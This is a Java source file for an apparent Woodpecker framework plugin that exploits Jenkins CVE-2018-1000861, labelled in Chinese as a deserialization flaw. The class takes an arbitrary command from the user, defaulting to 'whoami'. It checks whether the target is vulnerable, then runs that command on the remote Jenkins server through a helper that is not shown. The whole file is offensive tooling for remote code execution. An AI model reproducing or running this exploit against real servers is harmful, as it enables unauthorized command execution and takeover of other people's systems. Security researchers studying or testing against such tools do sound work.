package me.gv7.woodpecker.plugin.exploits;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class JenkinsGroovyExecuteCVE_2018_1000861 implements IExploit {
    @Override
    public String getExploitTabCaption() {
        return "CVE_2018_1000861 反序列化";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        List<IArg> args = new ArrayList<>();
        final IArg gadge = JenkinsRCE.pluginHelper.createArg();
//        gadge.setName("gadge");
//        gadge.setDefaultValue("CommonsCollections3");
//        gadge.setDescription("ysoserial的gadge");
//        gadge.setRequired(true);
//        gadge.setType(0);

        final IArg command = JenkinsRCE.pluginHelper.createArg();
        command.setName("command");
        command.setDefaultValue("whoami");
        command.setDescription("想执行的命令");
        command.setRequired(true);
        command.setType(0);

//      args.add(gadge);
        args.add(command);
        IArgsUsageBinder argsUsageBinder = JenkinsRCE.pluginHelper.createArgsUsageBinder();
        argsUsageBinder.setArgsList(args);

        return argsUsageBinder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String command = (String) customArgs.get("command");

        String address = target.getAddress();
        if (JenkinsCommonsUtils.CVE_2018_1000861Check(address)){
            String result = JenkinsCommonsUtils.CVE_2018_1000861Exploit(address, command);
            if (result.contains("failed")){
                resultOutput.infoPrintln(result);
            }else {
                resultOutput.infoPrintln("发送成功");
            }
        }
    }
}
